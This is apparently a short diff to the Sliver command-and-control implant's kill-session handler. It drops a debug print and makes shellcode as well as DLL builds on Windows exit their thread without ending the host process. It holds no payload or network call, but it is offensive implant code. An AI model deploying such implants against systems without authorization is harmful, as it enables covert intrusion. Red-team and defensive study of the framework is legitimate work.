@@ -47,13 +47,10 @@ func GetSpecialHandlers() map[uint32]SpecialHandler {
 func killHandler(data []byte, connection *transports.Connection) error {
 	killReq := &sliverpb.KillSessionReq{}
 	err := proto.Unmarshal(data, killReq)
-	// {{if .Debug}}
-	println("KILL called")
-	// {{end}}
 	if err != nil {
 		return err
 	}
-	// {{if .IsSharedLib}}
+	// {{if or .IsSharedLib .IsShellcode}}
 	// {{if eq .GOOS "windows"}}
 	if runtime.GOOS == "windows" {
 		// Windows only: ExitThread() instead of os.Exit() for DLL/shellcode slivers
